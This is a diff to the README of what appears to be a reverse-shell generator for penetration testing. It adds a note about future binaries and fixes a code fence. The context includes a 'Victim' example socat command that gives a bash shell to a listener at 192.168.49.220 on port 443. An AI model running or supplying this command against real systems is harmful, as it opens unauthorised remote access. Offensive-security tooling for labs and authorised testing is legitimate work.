@@ -8,6 +8,8 @@ Takes the name of a binary, an interface, and a port as input and returns revers
 
 If no interface or port number is supplied, the defaults are tun0 for interface and port 443.
 
+More binaries to be supported in the future.
+
 
 ## Examples
 
@@ -40,6 +42,9 @@ Listener:
                                                                                                                                                                                                                                              
 Victim:                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
-        socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:192.168.49.220:443 
+        socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:192.168.49.220:443
         
-        '''
+        
+        ```
+       
+       
